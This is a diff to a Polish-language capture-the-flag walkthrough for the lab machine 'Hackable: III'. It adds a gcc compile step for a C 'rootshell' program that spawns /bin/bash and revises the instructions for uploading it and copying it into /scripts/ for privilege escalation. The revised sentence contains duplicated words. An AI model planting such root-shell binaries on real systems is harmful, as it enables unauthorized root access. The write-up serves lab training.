@@ -270,7 +270,10 @@ void main()
   system("/bin/bash");
 }
 ```
-Rootshell wrzucamy do katalogu:
+```bash
+gcc rootshell.c -o rootshell
+```
+Rootshell wrzucamy wrzucamy na **Hackable: III** na konto **hackable_3** do katalogu domowego katalogu a potem kopiujemy do /scripts/:
 {: .text-justify}
 ```bash
 cp /home/hackable_3/rootshell /scripts/
